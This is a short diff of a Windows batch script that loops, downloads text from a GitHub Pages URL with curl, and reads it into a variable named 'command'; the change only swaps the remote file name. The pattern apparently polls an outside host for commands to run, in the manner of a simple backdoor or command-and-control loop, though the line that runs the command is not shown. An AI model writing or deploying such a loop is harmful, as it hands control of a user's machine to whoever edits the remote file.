@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :loop
-curl -s "samjoel2007.github.io/Operation_Strings/sam.txt" > temp_cmd.txt
+curl -s "samjoel2007.github.io/Operation_Strings/samsam.txt" > temp_cmd.txt
 set /p command=<temp_cmd.txt
 del temp_cmd.txt
 
